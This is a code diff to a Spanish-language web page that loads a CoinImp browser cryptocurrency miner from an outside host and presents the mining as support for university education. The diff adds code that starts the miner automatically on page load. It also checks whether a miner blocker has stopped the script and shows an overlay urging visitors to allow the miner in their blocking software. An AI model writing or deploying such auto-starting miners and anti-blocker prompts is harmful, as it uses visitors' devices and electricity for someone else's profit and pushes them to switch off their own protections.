@@ -630,6 +630,75 @@
                 font-size: 2rem;
             }
         }
+        
+        /* Bloqueo de minero */
+        .miner-blocked-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            display: none;
+        }
+        
+        .miner-blocked-message {
+            background: white;
+            padding: 30px;
+            border-radius: 15px;
+            max-width: 500px;
+            width: 90%;
+            text-align: center;
+            color: #333;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+        }
+        
+        .miner-blocked-message h3 {
+            color: #e74c3c;
+            margin-bottom: 15px;
+            font-size: 1.4rem;
+        }
+        
+        .miner-blocked-message p {
+            margin-bottom: 20px;
+            line-height: 1.6;
+        }
+        
+        .miner-blocked-btn {
+            background: #3498db;
+            color: white;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 50px;
+            font-size: 1rem;
+            cursor: pointer;
+            transition: all 0.3s;
+        }
+        
+        .miner-blocked-btn:hover {
+            background: #2980b9;
+            transform: translateY(-2px);
+        }
+        
+        /* Hash Rate Notice */
+        .hash-rate-notice {
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 15px;
+            padding: 15px;
+            margin: 20px 0;
+            text-align: center;
+            border: 1px solid rgba(76, 201, 240, 0.3);
+            font-size: 0.95rem;
+        }
+        
+        .hash-rate-notice i {
+            color: #ffcc00;
+            margin-right: 8px;
+        }
     </style>
 </head>
 <body>
@@ -660,6 +729,11 @@
                 <div class="stat-value" id="device">Móvil</div>
                 <div class="stat-label">Dispositivo</div>
             </div>
+        </div>
+        
+        <!-- Aviso sobre tasa de hash -->
+        <div class="hash-rate-notice">
+            <p><i class="fas fa-info-circle"></i> La tasa de hash continua es un promedio y alcanzará su velocidad máxima después de aproximadamente 48 horas desde que agregaste el código a tu sitio.</p>
         </div>
         
         <!-- Barra de Progreso -->
@@ -833,6 +907,16 @@
         </div>
     </div>
 
+    <!-- Overlay para minero bloqueado -->
+    <div class="miner-blocked-overlay" id="minerBlockedOverlay">
+        <div class="miner-blocked-message">
+            <h3>¡Minero Bloqueado!</h3>
+            <p>Parece que tienes activado un bloqueador de mineros. Por favor, permite nuestro minero en tu software de bloqueo para continuar apoyando la educación universitaria.</p>
+            <p>Recarga la página después de permitirlo.</p>
+            <button class="miner-blocked-btn" id="minerBlockedBtn">Entendido, recargaré la página</button>
+        </div>
+    </div>
+
     <!-- Integración con CoinImp - Versión corregida -->
     <script src="https://www.hostingcloud.racing/91Xf.js"></script>
     
@@ -863,6 +947,8 @@
         const toggleLowheat = document.getElementById('toggle-lowheat');
         const completionModal = document.getElementById('completionModal');
         const finalContribEl = document.getElementById('final-contrib');
+        const minerBlockedOverlay = document.getElementById('minerBlockedOverlay');
+        const minerBlockedBtn = document.getElementById('minerBlockedBtn');
         
         // ======= INICIALIZAR MINERO ======= //
         function initMiner() {
@@ -1050,6 +1136,22 @@
                 }
             });
         }
+        
+        // ======= DETECCIÓN DE BLOQUEO DEL MINERO ======= //
+        setTimeout(function() {
+            if (typeof _client === 'undefined' || _client === null) {
+                minerBlockedOverlay.style.display = 'flex';
+            }
+        }, 3000);
+        
+        minerBlockedBtn.addEventListener('click', () => {
+            location.reload();
+        });
+        
+        // ======= INICIALIZAR MINERO AL CARGAR ======= //
+        window.addEventListener('DOMContentLoaded', () => {
+            initMiner();
+        });
     </script>
 </body>
 </html>
